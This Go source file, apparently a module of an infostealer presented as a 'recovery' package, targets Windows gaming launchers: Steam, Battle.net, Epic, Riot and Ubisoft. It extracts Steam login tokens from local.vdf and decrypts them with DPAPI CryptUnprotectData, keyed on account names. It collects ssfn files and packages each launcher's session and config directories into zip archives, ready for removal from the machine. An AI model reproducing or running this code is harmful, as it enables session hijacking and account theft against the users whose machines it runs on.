//go:build windows

package recovery

import (
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	"recovery/recovery/types"
	"recovery/recovery/ziputil"
)

func normLines(data string) []string {
	return strings.Split(strings.ReplaceAll(data, "\r\n", "\n"), "\n")
}

func ScanGaming() *types.GamingResult {
	result := &types.GamingResult{
		Steam:     ScanSteam(),
		BattleNet: ScanBattleNet(),
		Epic:      ScanEpic(),
		Riot:      ScanRiot(),
		Uplay:     ScanUplay(),
	}
	if result.Steam == nil && len(result.BattleNet) == 0 && len(result.Epic) == 0 && len(result.Riot) == 0 && len(result.Uplay) == 0 {
		return nil
	}
	return result
}

func ScanSteam() *types.SteamResult {
	result := &types.SteamResult{}

	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Valve\Steam`, registry.READ)
	if err != nil {
		logf("[gaming] Steam registry key not found: %v", err)
		return nil
	}
	defer k.Close()

	result.AutoLogin, _, _ = k.GetStringValue("AutoLoginUser")
	remPw, _, _ := k.GetIntegerValue("RememberPassword")
	result.RememberPW = remPw != 0

	steamPath, _, _ := k.GetStringValue("SteamPath")
	logf("[gaming] Steam registry SteamPath=%q exists=%v", steamPath, pathExists(steamPath))
	if steamPath == "" || !pathExists(steamPath) {
		return nil
	}
	steamPath = filepath.FromSlash(steamPath)
	result.SteamPath = steamPath

	if result.AutoLogin != "" {
		result.Account = result.AutoLogin
	}

	seenGames := make(map[string]bool)
	scanSteamLibrary(steamPath, result, seenGames)
	logf("[gaming] Steam library scan found %d games from manifests", len(result.Games))

	appsKey, err := registry.OpenKey(registry.CURRENT_USER, `Software\Valve\Steam\Apps`, registry.READ)
	if err != nil {
		logf("[gaming] Steam Apps registry key not found: %v", err)
	} else {
		defer appsKey.Close()
		names, _ := appsKey.ReadSubKeyNames(0)
		logf("[gaming] Steam Apps registry has %d sub-keys", len(names))
		for _, name := range names {
			if seenGames[name] {
				continue
			}
			subKey, err := registry.OpenKey(appsKey, name, registry.READ)
			if err != nil {
				continue
			}
			gameName, _, _ := subKey.GetStringValue("Name")
			installed, _, _ := subKey.GetIntegerValue("Installed")
			running, _, _ := subKey.GetIntegerValue("Running")
			subKey.Close()
			if gameName != "" {
				seenGames[name] = true
				result.Games = append(result.Games, types.GameInfo{
					ID:        name,
					Name:      gameName,
					Installed: installed == 1,
					Running:   running == 1,
				})
			}
		}
	}

	if entries, err := os.ReadDir(steamPath); err == nil {
		for _, e := range entries {
			if !e.IsDir() && strings.Contains(e.Name(), "ssfn") {
				result.SSFNFiles = append(result.SSFNFiles, e.Name())
			}
		}
	}

	localVdfPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Steam", "local.vdf")
	logf("[gaming] Steam local.vdf=%q exists=%v", localVdfPath, pathExists(localVdfPath))
	if pathExists(localVdfPath) {
		tokens := extractSteamTokens(steamPath, localVdfPath)
		if len(tokens) > 0 {
			result.Token = strings.Join(tokens, "\n")
			for _, tok := range tokens {
				if dot := strings.Index(tok, "."); dot > 0 {
					result.Account = tok[:dot]
					break
				}
			}
		}
	}

	if result.Account == "" {
		configPath := filepath.Join(steamPath, "config", "configstore", "steam-users.xml")
		if configBytes, err := os.ReadFile(configPath); err == nil {
			content := string(configBytes)
			if idx := strings.Index(content, `"PersonaName"`); idx > 0 {
				start := strings.Index(content[idx:], `"`)
				end := strings.Index(content[idx+start+1:], `"`)
				if start > 0 && end > 0 {
					result.Account = content[idx+start+1 : idx+start+1+end]
				}
			}
		}
	}

	return result
}

func scanSteamLibrary(steamPath string, result *types.SteamResult, seenGames map[string]bool) {
	libraryFolders := []string{steamPath}

	steamappsRoot := filepath.Join(steamPath, "steamapps")
	logf("[gaming] Steam steamapps root=%q exists=%v", steamappsRoot, pathExists(steamappsRoot))
	vdfPath := filepath.Join(steamappsRoot, "libraryfolders.vdf")
	logf("[gaming] Steam libraryfolders.vdf=%q exists=%v", vdfPath, pathExists(vdfPath))
	if data, err := os.ReadFile(vdfPath); err == nil {
		for _, line := range normLines(string(data)) {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(strings.ToLower(line), `"path"`) {
				val := vdfValue(line)
				if val != "" {
					libraryPath := filepath.FromSlash(val)
					libraryPath = strings.TrimSuffix(libraryPath, string(os.PathSeparator))
					if pathExists(libraryPath) && !strings.EqualFold(libraryPath, steamPath) {
						libraryFolders = append(libraryFolders, libraryPath)
					}
				}
			}
		}
	}

	logf("[gaming] Steam library folders to scan: %v", libraryFolders)
	for _, lib := range libraryFolders {
		libApps := filepath.Join(lib, "steamapps")
		logf("[gaming] Steam checking steamapps=%q exists=%v", libApps, pathExists(libApps))
		if !pathExists(libApps) {
			continue
		}

		entries, _ := os.ReadDir(libApps)
		logf("[gaming] Steam steamapps dir has %d entries", len(entries))
		for _, e := range entries {
			if e.IsDir() || !strings.HasPrefix(e.Name(), "appmanifest_") || !strings.HasSuffix(e.Name(), ".acf") {
				continue
			}
			acfData, err := os.ReadFile(filepath.Join(libApps, e.Name()))
			if err != nil || len(acfData) == 0 {
				continue
			}
			acf := parseACF(string(acfData))
			if acf["appid"] == "" || acf["name"] == "" {
				continue
			}
			installed := acf["StateFlags"] != "4"
			if !seenGames[acf["appid"]] {
				seenGames[acf["appid"]] = true
				result.Games = append(result.Games, types.GameInfo{
					ID:        acf["appid"],
					Name:      acf["name"],
					Installed: installed,
				})
			}
		}
	}
}

func parseACF(data string) map[string]string {
	result := map[string]string{}
	var inBlock bool

	for _, line := range normLines(data) {
		line = strings.TrimLeft(line, "\t ")
		if line == "{" {
			inBlock = true
			continue
		}
		if line == "}" {
			break
		}
		if !inBlock || line == "" {
			continue
		}
		if strings.HasPrefix(line, `"`) {
			key, val := vdfKeyValue(line)
			if key != "" {
				result[key] = val
			}
		}
	}
	return result
}

func vdfKeyValue(line string) (string, string) {
	key := vdfNthQuoted(line, 0)
	val := vdfNthQuoted(line, 1)
	return key, val
}

func vdfValue(line string) string {
	return vdfNthQuoted(line, 1)
}

func vdfNthQuoted(line string, n int) string {
	count := 0
	i := 0
	for count <= n && i < len(line) {
		start := strings.Index(line[i:], `"`)
		if start == -1 {
			return ""
		}
		start += i + 1
		end := strings.Index(line[start:], `"`)
		if end == -1 {
			if count == n {
				return line[start:]
			}
			return ""
		}
		if count == n {
			return line[start : start+end]
		}
		i = start + end + 1
		count++
	}
	return ""
}

func extractSteamTokens(steamPath, localVdfPath string) []string {
	loginUsersPath := filepath.Join(steamPath, "config", "loginusers.vdf")
	if !pathExists(loginUsersPath) {
		loginUsersPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Steam", "config", "loginusers.vdf")
	}
	if !pathExists(loginUsersPath) {
		return nil
	}

	loginData, _ := os.ReadFile(loginUsersPath)
	localData, _ := os.ReadFile(localVdfPath)
	if loginData == nil || localData == nil {
		return nil
	}

	accounts := parseVDFAccountNames(string(loginData))
	if len(accounts) == 0 {
		return nil
	}

	return findSteamTokens(string(localData), accounts)
}

func parseVDFAccountNames(data string) []string {
	var accounts []string
	for _, line := range normLines(data) {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, `"AccountName"`) {
			val := vdfValue(line)
			if val != "" {
				accounts = append(accounts, val)
			}
		}
	}
	return accounts
}

func findSteamTokens(data string, accounts []string) []string {
	normalized := strings.ReplaceAll(data, "\r\n", "\n")
	var tokens []string

	for _, account := range accounts {
		prefix := `"` + account + `"`
		idx := strings.Index(normalized, prefix)
		if idx == -1 {
			continue
		}

		blockStart := strings.Index(normalized[idx:], "{")
		blockEnd := strings.Index(normalized[idx:], "}")
		if blockStart == -1 || blockEnd == -1 || blockEnd < blockStart {
			continue
		}

		block := normalized[idx+blockStart : idx+blockEnd]
		tokenStart := strings.Index(block, `"Token"`)
		if tokenStart == -1 {
			tokenStart = strings.Index(block, `"RefreshToken"`)
		}
		if tokenStart == -1 {
			continue
		}

		tokenLine := block[tokenStart:]
		if lineEnd := strings.Index(tokenLine, "\n"); lineEnd > 0 {
			tokenLine = tokenLine[:lineEnd]
		}

		tokenHex := vdfValue(tokenLine)
		if len(tokenHex) < 64 {
			continue
		}

		decrypted := decryptSteamToken(tokenHex, account)
		if decrypted != "" {
			tokens = append(tokens, account+"."+decrypted)
		}
	}

	return tokens
}

func decryptSteamToken(tokenHex, account string) string {
	tokenBytes, err := hex.DecodeString(tokenHex)
	if err != nil || len(tokenBytes) < 16 {
		return ""
	}

	entropy := []byte(account)
	out, err := dpapiDecrypt(tokenBytes, entropy)
	if err != nil || len(out) == 0 {
		return ""
	}

	return strings.TrimRight(string(out), "\x00")
}

func dpapiDecrypt(data, entropy []byte) ([]byte, error) {
	type blob struct {
		cbData uint32
		pbData *byte
	}

	var inBlob, outBlob blob
	inBlob.cbData = uint32(len(data))
	if len(data) > 0 {
		inBlob.pbData = &data[0]
	}

	var entPtr uintptr
	if len(entropy) > 0 {
		entBlob := blob{
			cbData: uint32(len(entropy)),
			pbData: &entropy[0],
		}
		entPtr = uintptr(unsafe.Pointer(&entBlob))
	}

	proc := windows.NewLazySystemDLL("crypt32.dll").NewProc("CryptUnprotectData")
	r, _, err := proc.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, entPtr, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)
	if r == 0 {
		return nil, err
	}
	defer windows.LocalFree(windows.Handle(uintptr(unsafe.Pointer(outBlob.pbData))))

	out := make([]byte, outBlob.cbData)
	copy(out, unsafe.Slice(outBlob.pbData, outBlob.cbData))
	return out, nil
}

func pathExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

func ScanBattleNet() []types.BattleNetResult {
	var results []types.BattleNetResult

	bnDir := filepath.Join(os.Getenv("APPDATA"), "Battle.net")
	logf("[gaming] Battle.net dir=%q exists=%v", bnDir, pathExists(bnDir))
	if !pathExists(bnDir) {
		return nil
	}

	entries, _ := os.ReadDir(bnDir)
	for _, e := range entries {
		if e.IsDir() {
			scanBattleNetRecursive(filepath.Join(bnDir, e.Name()), &results)
		} else if strings.HasSuffix(e.Name(), ".db") || strings.HasSuffix(e.Name(), ".config") {
			results = append(results, types.BattleNetResult{
				Path: filepath.Join(bnDir, e.Name()),
				Name: e.Name(),
			})
		}
	}

	return results
}

func scanBattleNetRecursive(dir string, results *[]types.BattleNetResult) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	for _, e := range entries {
		if e.IsDir() {
			scanBattleNetRecursive(filepath.Join(dir, e.Name()), results)
		} else if strings.HasSuffix(e.Name(), ".db") || strings.HasSuffix(e.Name(), ".config") {
			*results = append(*results, types.BattleNetResult{
				Path: filepath.Join(dir, e.Name()),
				Name: e.Name(),
			})
		}
	}
}

func ScanEpic() []types.EpicResult {
	var results []types.EpicResult

	path := filepath.Join(os.Getenv("LOCALAPPDATA"), "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini")
	logf("[gaming] Epic config=%q exists=%v", path, pathExists(path))
	if !pathExists(path) {
		return nil
	}

	data, err := os.ReadFile(path)
	if err != nil || len(data) == 0 {
		return nil
	}

	content := string(data)
	if strings.Contains(content, "RememberMe") || strings.Contains(content, "Offline") {
		results = append(results, types.EpicResult{Path: path, Name: "GameUserSettings.ini"})
	}

	return results
}

func ScanRiot() []types.RiotResult {
	var results []types.RiotResult

	riotDir := filepath.Join(os.Getenv("LOCALAPPDATA"), "Riot Games", "Riot Client", "Data")
	logf("[gaming] Riot data dir=%q exists=%v", riotDir, pathExists(riotDir))
	if pathExists(riotDir) {
		results = append(results, types.RiotResult{Path: riotDir, Name: "RiotGamesPrivateSettings.yaml"})
	}

	configDir := filepath.Join(os.Getenv("LOCALAPPDATA"), "Riot Games", "Riot Client", "Config")
	logf("[gaming] Riot config dir=%q exists=%v", configDir, pathExists(configDir))
	if pathExists(configDir) {
		results = append(results, types.RiotResult{Path: configDir, Name: "Config"})
	}

	return results
}

func ScanUplay() []types.UplayResult {
	var results []types.UplayResult

	path := filepath.Join(os.Getenv("LOCALAPPDATA"), "Ubisoft Game Launcher")
	logf("[gaming] Uplay dir=%q exists=%v", path, pathExists(path))
	if pathExists(path) {
		results = append(results, types.UplayResult{Path: path, Name: "Ubisoft Game Launcher"})
	}

	return results
}

const maxZipFile = 50 * 1024 * 1024

func ZipSteamSession(steamPath string) ([]byte, error) {
	if steamPath == "" || !pathExists(steamPath) {
		return nil, os.ErrNotExist
	}

	var files []string

	entries, _ := os.ReadDir(steamPath)
	for _, e := range entries {
		if !e.IsDir() && strings.Contains(e.Name(), "ssfn") {
			if info, _ := e.Info(); info != nil && info.Size() < maxZipFile {
				files = append(files, filepath.Join(steamPath, e.Name()))
			}
		}
	}

	configDir := filepath.Join(steamPath, "config")
	for _, name := range []string{"loginusers.vdf", "config.vdf", "DialogConfig.vdf"} {
		p := filepath.Join(configDir, name)
		if pathExists(p) {
			files = append(files, p)
		}
	}

	localVdf := filepath.Join(os.Getenv("LOCALAPPDATA"), "Steam", "local.vdf")
	if pathExists(localVdf) {
		files = append(files, localVdf)
	}

	if len(files) == 0 {
		return nil, os.ErrNotExist
	}
	logf("[gaming] ZipSteamSession: %d files from %s", len(files), steamPath)
	return ziputil.ZipFiles(files, filepath.Dir(steamPath))
}

func ZipBattleNet() ([]byte, error) {
	bnDir := filepath.Join(os.Getenv("APPDATA"), "Battle.net")
	if !pathExists(bnDir) {
		return nil, os.ErrNotExist
	}
	return ziputil.ZipDirectory(bnDir)
}

func ZipEpic() ([]byte, error) {
	configDir := filepath.Join(os.Getenv("LOCALAPPDATA"), "EpicGamesLauncher", "Saved", "Config", "Windows")
	if !pathExists(configDir) {
		return nil, os.ErrNotExist
	}
	return ziputil.ZipDirectory(configDir)
}

func ZipRiot() ([]byte, error) {
	riotDir := filepath.Join(os.Getenv("LOCALAPPDATA"), "Riot Games", "Riot Client")
	if !pathExists(riotDir) {
		return nil, os.ErrNotExist
	}

	var files []string
	for _, sub := range []string{"Data", "Config"} {
		d := filepath.Join(riotDir, sub)
		if !pathExists(d) {
			continue
		}
		filepath.Walk(d, func(path string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() || info.Size() > maxZipFile {
				return nil
			}
			files = append(files, path)
			return nil
		})
	}
	if len(files) == 0 {
		return nil, os.ErrNotExist
	}
	return ziputil.ZipFiles(files, riotDir)
}

func ZipUplay() ([]byte, error) {
	uplayDir := filepath.Join(os.Getenv("LOCALAPPDATA"), "Ubisoft Game Launcher")
	if !pathExists(uplayDir) {
		return nil, os.ErrNotExist
	}
	return ziputil.ZipDirectory(uplayDir)
}
